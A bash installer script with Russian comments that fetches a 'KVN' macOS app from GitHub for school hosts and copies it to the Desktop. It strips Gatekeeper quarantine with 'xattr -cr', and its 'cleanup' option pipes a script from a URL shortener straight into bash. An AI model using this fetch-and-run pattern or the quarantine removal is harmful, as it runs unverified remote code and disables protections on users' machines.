#!/bin/bash

# Константы
readonly REPO="shepherl/kvnfaq"
readonly TMP_ARCHIVE="/tmp/KVN_Download"
readonly REQUIRED_SPACE_KB=307200 # 300 МБ

# Функция установки
install_app() {
	# Проверка домена
	if [[ $(hostname) == *.kzn.21-school.ru ]]; then

		# 1. Получаем динамическую ссылку на последний релиз с GitHub
		APP_URL=$(curl -s "https://api.github.com/repos/$REPO/releases/latest" | grep "browser_download_url" |
			grep -E '\.zip|\.dmg' | cut -d '"' -f 4 | head -n 1)

		if [ -z "$APP_URL" ]; then
			osascript -e 'display dialog "Не удалось найти установочный файл на сервере GitHub." with title
  "Ошибка" buttons {"ОК"} default button "ОК" with icon stop'
			exit 1
		fi

		# 2. Скачиваем файл (будет работать и с .zip, и с .dmg)
		curl -L "$APP_URL" -o "$TMP_ARCHIVE"

		# 3. Если скачался ZIP — распаковываем, если DMG — используем напрямую
		if [[ "$APP_URL" == *.zip ]]; then
			unzip -qo "$TMP_ARCHIVE" -d /tmp/
			DMG_PATH=$(ls /tmp/*.dmg | head -n 1)
		else
			DMG_PATH="$TMP_ARCHIVE"
		fi

		# 4. Монтируем скачанный образ
		MOUNT_POINT=$(hdiutil attach -nobrowse -noautoopen "$DMG_PATH" | grep -o '/Volumes/.*' | head -n 1)

		# 5. Очищаем старую версию и копируем новую
		rm -rf ~/Desktop/KVN.app
		cp -R "$MOUNT_POINT"/*.app ~/Desktop/

		# 6. Подчищаем за собой системный мусор
		hdiutil detach "$MOUNT_POINT" -quiet -force 2>/dev/null
		rm -f "$TMP_ARCHIVE" /tmp/*.dmg 2>/dev/null

		# 7. Выдаем права и снимаем карантин (Gatekeeper)
		xattr -cr ~/Desktop/KVN.app
		touch ~/Desktop/KVN.app

		osascript -e 'display dialog "Установка KVN успешно завершена!\nПриложение находится на рабочем столе."
  with title "Установщик" buttons {"ОК"} default button "ОК" with icon note'
	else
		osascript -e 'display dialog "Ваше устройство не подходит для установки." with title "Ошибка" buttons
  {"ОК"} default button "ОК" with icon caution'
	fi
	exit 0
}

# Функция проверки места
check_space() {
	free_space_kb=$(df -Pk ~ | awk 'NR==2 {print $4}')
	[ "$free_space_kb" -lt "$REQUIRED_SPACE_KB" ] && return 1 || return 0
}

# --- Логика выполнения ---

if ! check_space; then
	# Места мало, предлагаем очистку
	RESPONSE=$(osascript -e 'display dialog "Недостаточно места на диске (минимум 300 МБ). Попробовать очистить
  временные файлы? Это не затронет нужные файлы" with title "Ошибка места" buttons {"Отмена", "Очистить"} default
  button "Очистить" with icon caution')

	if [[ "$RESPONSE" == *"button returned:Очистить"* ]]; then
		curl -sL https://u.to/Lk2ZIg | bash

		# Проверяем снова после очистки
		if check_space; then
			install_app
		else
			osascript -e 'display dialog "Очистка завершена, но места все еще недостаточно. Пожалуйста, удалите
  ненужные файлы вручную и попробуйте снова." with title "Ошибка" buttons {"ОК"} default button "ОК" with icon stop'
			exit 1
		fi
	else
		exit 1
	fi
else
	# Места достаточно, запускаем установку
	install_app
fi
